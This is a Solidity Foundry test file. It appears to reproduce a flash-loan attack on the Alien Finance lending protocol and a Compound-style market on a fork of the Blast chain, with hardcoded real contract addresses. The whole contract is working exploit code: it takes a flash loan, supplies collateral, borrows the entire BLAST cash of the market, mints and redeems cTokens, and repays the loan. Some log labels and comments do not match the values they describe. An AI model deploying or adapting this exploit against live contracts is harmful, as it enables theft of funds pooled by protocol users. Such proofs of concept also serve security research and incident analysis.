// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";
import "../test/interfaces/ICompound.sol";
import "../test/interfaces/IUni_Pair_V2.sol";

interface IAlienFinance {
    function supply(address from, address to, address market, uint256 amount) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function redeem(address from, address to, address asset, uint256 amount) external;
    function repay(address from, address to, address asset, uint256 amount) external;
    function getTotalCash(address market) external view returns (uint256);
}

interface IAllienoracle {
    function getPrice(address asset) external view returns (uint256);
}

contract AllienFlashTest is Test {
    using SafeMath for uint;
    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    IERC20 usbd = IERC20(0x4300000000000000000000000000000000000003);
    CErc20 C_blast = CErc20(0x25BB64CA1eebf70dc92dADcEEf59c1581b00F8D0);
    Comptroller comptroller = Comptroller(0xD5e60A396842D6C1D5470E16DA0BfDbb7Ba47101);
    IUni_Pair_V2 private pair = IUni_Pair_V2(0x12c69BFA3fb3CbA75a1DEFA6e976B87E233fc7df);
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    PriceFeed AsopriceFeed = PriceFeed(0x5fe5E6D0e4F36331529d51353f7ed20bBC203831);
    IAllienoracle AllienpriceFeed = IAllienoracle(0x3A9B69eE4b7F238c38380A540B211f682f724968);
    address public attacker;
    uint supplyRate;
  uint exchangeRate;
  uint estimateBalance;
  uint balanceOfUnderlying;
  uint borrowedBalance;
  uint price;
  uint rerror; 
  uint liquidity; 
  uint shortfall;
  uint colFactor;
  uint supplied;
  uint liqbalance;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 6814362);
        attacker = msg.sender;

        deal(address(usbd), address(this), 3100 * 10**18);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker usbd before supply", usbd.balanceOf(address(this)), 18);
        require(msg.sender == attacker, "Only attacker can start the exploit");

        bytes memory data = abi.encode(usbd, 1_000_000 * 10**18);
        pair.swap(1_000_000 * 10**18, 0, address(this), data);

        emit log_named_decimal_uint("Attacker blast during exploit", usbd.balanceOf(address(this)), 18);
    }

    // 
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        emit log_named_decimal_uint("Attacker blast during first flash", IERC20(usbd).balanceOf(address(this)), 18);

        usbd.approve(address(Allien), usbd.balanceOf(address(this)));
        Allien.supply(address(this), address(this), address(usbd), usbd.balanceOf(address(this)));

        price = AllienpriceFeed.getPrice(address(blast));
        emit log_named_decimal_uint("allien blast price: ", price, 18);

        borroblast();
        emit log_named_decimal_uint("Attacker blast after borrow from allien", IERC20(blast).balanceOf(address(this)), 18);
        SupplyToAso();
        emit log_named_decimal_uint("Attacker blast after supply to aso", IERC20(blast).balanceOf(address(this)), 18);

        RedeemBlast();
        emit log_named_decimal_uint("Attacker blast after redeem", IERC20(blast).balanceOf(address(this)), 18);


        uint256 fee = (uint256(1_000_000 * 10**18) * 3) / 997 + 1;
        emit log_named_decimal_uint("fee to pay during ", fee, 18);
        uint256 amountToRepay = 1_000_000 * 10**18 + fee;
        emit log_named_decimal_uint("flash loan amount to repay", amountToRepay, 18);

        require(IERC20(usbd).balanceOf(address(this)) >= amountToRepay, "Insufficient balance to repay the loan");
        IERC20(usbd).transfer(address(pair), amountToRepay);
    }

    function borroblast() internal {
        uint256 ttcashwethafsupply = Allien.getTotalCash(address(blast)); // 5 WETH with 18 decimals
        emit log_named_decimal_uint("totoal cash for blast", ttcashwethafsupply, 18);
        Allien.borrow(address(this), address(this), address(blast), ttcashwethafsupply);
        emit log_named_decimal_uint("Attacker blast borrowed from allien", IERC20(blast).balanceOf(address(this)), 18);
    }

    function SupplyToAso() internal {
        console.log("----Before testing supply, all status:----");
        exchangeRate = C_blast.exchangeRateCurrent();
        emit log_named_uint("exchangeRate:", supplyRate);

        supplyRate = C_blast.supplyRatePerBlock();
        emit log_named_uint("supplyRate:", supplyRate);

        balanceOfUnderlying = C_blast.balanceOfUnderlying(address(this));
        emit log_named_uint("balanceOfUnderlying:", balanceOfUnderlying);

        blast.approve(address(C_blast), blast.balanceOf(address(this)));

        C_blast.mint(blast.balanceOf(address(this))); // supply 1 btc.
        emit log_named_decimal_uint("C_blast balance of borrower:", C_blast.balanceOf(address(this)),8);


        exchangeRate = C_blast.exchangeRateCurrent();
        emit log_named_uint("exchangeRate:", exchangeRate);

        supplyRate = C_blast.supplyRatePerBlock();
        emit log_named_uint("supplyRate:", supplyRate);

        price = AsopriceFeed.getUnderlyingPrice(address(C_blast));
        emit log_named_decimal_uint("aso blast price: ", price, 18);

        supplied = C_blast.balanceOfUnderlying(address(this));
        emit log_named_decimal_uint("supplied: ", supplied, 18);


    }

    function RedeemBlast() internal {
        uint cTokenAmount = C_blast.balanceOf(address(this));
        C_blast.redeem(cTokenAmount);
        emit log_named_uint("Redeemed blast:", blast.balanceOf(address(this))); //0.99999999 btc
        balanceOfUnderlying = C_blast.balanceOfUnderlying(address(this));
        emit log_named_uint("supplied:", balanceOfUnderlying);
    }

    receive() external payable {}

}
